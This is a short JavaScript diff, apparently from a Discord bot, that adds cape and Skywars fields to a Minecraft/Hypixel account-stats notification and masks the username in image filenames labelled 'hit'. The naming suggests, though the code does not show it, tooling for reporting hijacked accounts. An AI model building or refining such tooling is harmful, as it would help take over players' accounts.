@@ -57,11 +57,13 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
 
         const stats = {
             username: accountData.username || 'Unknown',
+            capes: accountData.capes || [],
             rank: accountData.rank || 'NONE',
             networth: accountData.networth || '0',
             bedwars: accountData.bedwars || accountData.bedwarsLevel || '0',
             networkLevel: accountData.networkLevel || '0',
             sbLevel: accountData.sbLevel || '0',
+            skywarsLevel: accountData.skywarsLevel || '0',
             duelKDR: accountData.duelKDR || '0',
             duelWinstreak: accountData.duelWinstreak || '0',
             plusColour: accountData.plusColour || 'None',
@@ -75,7 +77,10 @@ async function sendSecureNotification(client, accountData, targetChannelId = nul
         };
 
         const timestamp = Date.now();
-        const filename = `secure_${accountData.username}_${timestamp}.png`;
+        const obscureFilename = accountData.username && accountData.username.length > 3
+            ? accountData.username.substring(0, 2) + "x".repeat(accountData.username.length - 2)
+            : "hit";
+        const filename = `hit_${obscureFilename}_${timestamp}.png`;
         const tempDir = path.join(__dirname, 'temp');
 
         if (!fs.existsSync(tempDir)) {
